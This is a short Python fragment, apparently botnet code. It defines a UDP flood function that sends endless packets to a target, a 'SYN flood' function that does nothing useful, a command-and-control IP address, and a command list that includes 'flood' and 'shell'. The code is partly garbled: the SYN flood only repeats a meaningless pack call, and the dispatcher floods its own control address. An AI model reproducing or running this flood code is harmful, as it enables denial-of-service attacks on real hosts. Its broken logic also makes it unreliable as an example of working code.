import socket, struct
def udp_flood(target):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True: s.sendto(b"X" * 1024, (target, 80))
def syn_flood(target):
    while True: struct.pack("!HH", 1, 2)
C2 = "198.51.100.60"
commands = ["flood", "stop", "update", "shell"]
def dispatch(cmd):
    if cmd == "flood": udp_flood(C2)
